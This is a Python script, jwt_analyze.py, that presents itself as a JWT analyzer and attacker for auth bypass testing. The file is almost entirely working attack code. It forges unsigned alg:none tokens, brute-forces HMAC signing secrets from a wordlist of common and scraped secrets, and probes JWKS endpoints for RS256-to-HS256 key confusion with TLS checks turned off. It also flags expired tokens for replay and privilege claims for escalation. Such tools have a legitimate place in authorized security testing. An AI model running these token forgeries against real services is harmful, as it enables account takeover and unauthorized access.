#!/usr/bin/env python3
"""
jwt_analyze.py — JWT Token Analyzer & Attacker
Analyzes extracted JWT tokens for:
  - alg:none bypass (forge unsigned tokens)
  - HMAC secret brute-force (SecLists JWT secrets)
  - RS256→HS256 key confusion
  - Expired token replay
  - Claim analysis (admin flags, roles, permissions)

Usage:
  python3 jwt_analyze.py -i jwts.txt -o findings.txt -t 20
  python3 jwt_analyze.py -i jwts.txt -o /dev/stdout --dry-run
"""

import argparse
import base64
import hashlib
import hmac
import json
import os
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── SecLists JWT secrets wordlist ──
SECLISTS = os.environ.get("SECLISTS", "/usr/share/seclists")
JWT_SECRETS_FILE = os.path.join(SECLISTS, "Passwords", "scraped-JWT-secrets.txt")
COMMON_SECRETS = [
    "secret", "password", "123456", "admin", "key", "test", "default",
    "changeme", "supersecret", "jwt_secret", "token", "mysecret",
    "HS256", "your-256-bit-secret", "your-secret-key",
]


def b64url_decode(data):
    """Base64url decode with padding fix."""
    data = data.replace("-", "+").replace("_", "/")
    pad = 4 - len(data) % 4
    if pad != 4:
        data += "=" * pad
    try:
        return base64.b64decode(data)
    except Exception:
        return None


def b64url_encode(data):
    """Base64url encode without padding."""
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def decode_jwt(token):
    """Decode JWT parts without verification."""
    parts = token.strip().split(".")
    if len(parts) < 2:
        return None, None, None

    header_raw = b64url_decode(parts[0])
    payload_raw = b64url_decode(parts[1])
    signature = parts[2] if len(parts) > 2 else ""

    if header_raw is None or payload_raw is None:
        return None, None, None

    try:
        header = json.loads(header_raw)
    except (json.JSONDecodeError, UnicodeDecodeError):
        return None, None, None
    try:
        payload = json.loads(payload_raw)
    except (json.JSONDecodeError, UnicodeDecodeError):
        return None, None, None

    return header, payload, signature


def check_alg_none(token, header, payload):
    """Test alg:none bypass — forge unsigned token."""
    findings = []

    # Create alg:none variants
    none_variants = ["none", "None", "NONE", "nOnE"]
    original_parts = token.strip().split(".")

    for alg_val in none_variants:
        forged_header = dict(header)
        forged_header["alg"] = alg_val
        forged_h = b64url_encode(json.dumps(forged_header, separators=(",", ":")))
        forged_token = f"{forged_h}.{original_parts[1]}."

        findings.append({
            "type": "ALG_NONE",
            "severity": "P1",
            "confidence": "CRIT",
            "detail": f"alg:{alg_val} bypass possible",
            "forged_token": forged_token,
        })

    return findings


def check_weak_hmac(token, header, payload):
    """Brute-force HMAC secret against wordlist."""
    findings = []
    alg = header.get("alg", "").upper()

    if alg not in ("HS256", "HS384", "HS512"):
        return findings

    hash_map = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }
    hash_func = hash_map[alg]

    parts = token.strip().split(".")
    if len(parts) < 3:
        return findings

    signing_input = f"{parts[0]}.{parts[1]}".encode()
    expected_sig = b64url_decode(parts[2])
    if expected_sig is None:
        return findings

    # Build wordlist
    secrets = list(COMMON_SECRETS)
    if os.path.isfile(JWT_SECRETS_FILE):
        try:
            with open(JWT_SECRETS_FILE, "r", errors="ignore") as f:
                for line in f:
                    secret = line.strip()
                    if secret and not secret.startswith("#"):
                        secrets.append(secret)
        except (IOError, PermissionError):
            pass

    for secret in secrets:
        try:
            computed = hmac.new(
                secret.encode(), signing_input, hash_func
            ).digest()
            if computed == expected_sig:
                findings.append({
                    "type": "WEAK_SECRET",
                    "severity": "P1",
                    "confidence": "CRIT",
                    "detail": f"HMAC secret: \"{secret}\"",
                    "secret": secret,
                })
                break  # Found it, no need to continue
        except Exception:
            continue

    return findings


def check_key_confusion(token, header, payload):
    """Check for RS256→HS256 key confusion (requires JWKS endpoint)."""
    findings = []
    alg = header.get("alg", "").upper()

    if alg not in ("RS256", "RS384", "RS512"):
        return findings

    # Look for JWKS URI in header
    jku = header.get("jku", "")
    iss = payload.get("iss", "")

    # Try common JWKS locations
    jwks_urls = []
    if jku:
        jwks_urls.append(jku)
    if iss:
        if iss.startswith("http"):
            jwks_urls.append(f"{iss.rstrip('/')}/.well-known/jwks.json")
            jwks_urls.append(f"{iss.rstrip('/')}/jwks")
        else:
            jwks_urls.append(f"https://{iss}/.well-known/jwks.json")

    for jwks_url in jwks_urls:
        try:
            resp = requests.get(
                jwks_url, timeout=10, verify=False,
                headers={"User-Agent": "noleak"}
            )
            if resp.status_code == 200 and "keys" in resp.text:
                findings.append({
                    "type": "KEY_CONFUSION",
                    "severity": "P1",
                    "confidence": "HIGH",
                    "detail": f"RS256→HS256 confusion possible | JWKS: {jwks_url}",
                    "jwks_url": jwks_url,
                })
                break
        except requests.RequestException:
            continue

    return findings


def check_expiry(token, header, payload):
    """Check for expired token replay opportunities."""
    findings = []
    now = datetime.now(timezone.utc).timestamp()

    exp = payload.get("exp")
    if exp is None:
        findings.append({
            "type": "NO_EXPIRY",
            "severity": "P2",
            "confidence": "MED",
            "detail": "Token has no expiration claim — never expires",
        })
    elif isinstance(exp, (int, float)):
        exp_dt = datetime.fromtimestamp(exp, tz=timezone.utc)
        if exp < now:
            age_days = int((now - exp) / 86400)
            findings.append({
                "type": "EXPIRED_TOKEN",
                "severity": "P2",
                "confidence": "MED",
                "detail": f"Token expired {age_days}d ago ({exp_dt.isoformat()}) — test replay",
                "expired_days": age_days,
            })

    iat = payload.get("iat")
    if iat and isinstance(iat, (int, float)):
        age_days = int((now - iat) / 86400)
        if age_days > 365:
            findings.append({
                "type": "OLD_TOKEN",
                "severity": "P3",
                "confidence": "LOW",
                "detail": f"Token issued {age_days}d ago — may indicate stale credentials",
            })

    return findings


def check_claims(token, header, payload):
    """Analyze claims for privilege escalation opportunities."""
    findings = []
    interesting_claims = {
        "admin": ("ADMIN_CLAIM", "P1", "Admin flag in token"),
        "is_admin": ("ADMIN_CLAIM", "P1", "Admin flag in token"),
        "isAdmin": ("ADMIN_CLAIM", "P1", "Admin flag in token"),
        "role": ("ROLE_CLAIM", "P2", "Role claim"),
        "roles": ("ROLE_CLAIM", "P2", "Roles claim"),
        "scope": ("SCOPE_CLAIM", "P2", "OAuth scope"),
        "permissions": ("PERM_CLAIM", "P2", "Permissions claim"),
        "groups": ("GROUP_CLAIM", "P2", "Group membership"),
        "tenant_id": ("TENANT_CLAIM", "P2", "Tenant identifier"),
        "org_id": ("ORG_CLAIM", "P2", "Organization identifier"),
        "email": ("EMAIL_CLAIM", "P3", "Email in token"),
        "sub": ("SUBJECT_CLAIM", "P3", "Subject identifier"),
    }

    for claim, (ftype, severity, desc) in interesting_claims.items():
        if claim in payload:
            value = payload[claim]
            # Truncate long values
            val_str = str(value)
            if len(val_str) > 100:
                val_str = val_str[:100] + "..."
            findings.append({
                "type": ftype,
                "severity": severity,
                "confidence": "INFO",
                "detail": f"{desc}: {claim}={val_str}",
            })

    # Check for kid (Key ID) injection
    kid = header.get("kid", "")
    if kid:
        # SQL injection in kid
        if any(c in kid for c in ["'", '"', ";", "--", "/*"]):
            findings.append({
                "type": "KID_INJECTION",
                "severity": "P1",
                "confidence": "HIGH",
                "detail": f"Suspicious kid value (possible SQLi): {kid}",
            })
        # Path traversal in kid
        if ".." in kid or "/" in kid:
            findings.append({
                "type": "KID_TRAVERSAL",
                "severity": "P1",
                "confidence": "HIGH",
                "detail": f"Path traversal in kid: {kid}",
            })

    return findings


def analyze_token(token, context=""):
    """Run all checks on a single JWT token."""
    header, payload, signature = decode_jwt(token)
    if header is None or payload is None:
        return []

    all_findings = []
    all_findings.extend(check_alg_none(token, header, payload))
    all_findings.extend(check_weak_hmac(token, header, payload))
    all_findings.extend(check_key_confusion(token, header, payload))
    all_findings.extend(check_expiry(token, header, payload))
    all_findings.extend(check_claims(token, header, payload))

    # Add context and token info to each finding
    alg = header.get("alg", "unknown")
    for f in all_findings:
        f["token_preview"] = token[:50] + "..."
        f["algorithm"] = alg
        f["context"] = context

    return all_findings


def format_finding(f, context=""):
    """Format a finding as a single line."""
    ctx = f.get("context", context)
    source = f" | source={ctx}" if ctx else ""
    extra = ""
    if f["type"] == "WEAK_SECRET":
        extra = f" | Forge any token with secret"
    elif f["type"] == "ALG_NONE":
        extra = f" | forged_token={f.get('forged_token', '')[:80]}"
    elif f["type"] == "KEY_CONFUSION":
        extra = f" | jwks={f.get('jwks_url', '')}"

    return (
        f"[{f['severity']}:JWT:{f['confidence']}] {f['type']} "
        f"| alg={f['algorithm']} | {f['detail']}{extra}{source}"
    )


def main():
    parser = argparse.ArgumentParser(
        description="JWT Token Analyzer — test for auth bypass vulnerabilities"
    )
    parser.add_argument(
        "-i", "--input", required=True,
        help="Input file with JWT tokens (one per line)"
    )
    parser.add_argument(
        "-o", "--output", required=False,
        help="Output file for findings (optional, also prints to stdout)"
    )
    parser.add_argument(
        "-t", "--threads", type=int, default=20,
        help="Number of threads (default: 20)"
    )
    parser.add_argument(
        "--context", required=False,
        help="Context file mapping tokens to sources"
    )
    parser.add_argument(
        "--dry-run", action="store_true",
        help="Decode and display tokens without attacking"
    )
    args = parser.parse_args()

    # Load tokens
    try:
        with open(args.input, "r") as f:
            tokens = [line.strip() for line in f if line.strip()]
    except (IOError, PermissionError) as e:
        print(f"[ERROR] Cannot read input: {e}", file=sys.stderr)
        sys.exit(1)

    if not tokens:
        print("[*] No tokens to analyze")
        return

    # Load context mapping
    context_map = {}
    if args.context and os.path.isfile(args.context):
        try:
            with open(args.context, "r") as f:
                for line in f:
                    line = line.strip()
                    if ":" in line:
                        # Format: SOURCE:detail:token
                        parts = line.split(":", 2)
                        if len(parts) >= 3:
                            token_key = parts[2][:50]
                            context_map[token_key] = f"{parts[0]}:{parts[1]}"
        except (IOError, PermissionError):
            pass

    print(f"[*] Loaded {len(tokens)} JWT token(s)")

    # Dry-run: just decode and display
    if args.dry_run:
        for token in tokens:
            header, payload, sig = decode_jwt(token)
            if header:
                print(f"\n[TOKEN] {token[:60]}...")
                print(f"  Header:  {json.dumps(header)}")
                print(f"  Payload: {json.dumps(payload, indent=2)}")
                print(f"  Sig:     {'(empty)' if not sig else sig[:30] + '...'}")
        return

    # Analyze tokens
    lock = threading.Lock()
    completed = [0]
    all_findings = []

    def process_token(token):
        ctx = context_map.get(token[:50], "")
        findings = analyze_token(token, ctx)
        with lock:
            completed[0] += 1
            if completed[0] % 10 == 0 or findings:
                print(f"[*] Progress: {completed[0]}/{len(tokens)} tokens analyzed")
            for f in findings:
                line = format_finding(f)
                # Only print actionable findings (not INFO-level claims)
                if f["confidence"] != "INFO":
                    print(f"  {line}")
                all_findings.append(line)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(process_token, t): t for t in tokens}
        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"  [ERROR] {futures[future][:40]}...: {e}")

    # Write output
    if args.output and all_findings:
        try:
            with open(args.output, "w") as f:
                for line in all_findings:
                    f.write(line + "\n")
            print(f"\n[*] Wrote {len(all_findings)} finding(s) to {args.output}")
        except (IOError, PermissionError) as e:
            print(f"[ERROR] Cannot write output: {e}", file=sys.stderr)

    # Summary
    crit_count = sum(1 for f in all_findings if ":CRIT]" in f)
    high_count = sum(1 for f in all_findings if ":HIGH]" in f)
    print(f"\n[*] Analysis complete: {len(tokens)} tokens, "
          f"{len(all_findings)} findings ({crit_count} critical, {high_count} high)")


if __name__ == "__main__":
    main()
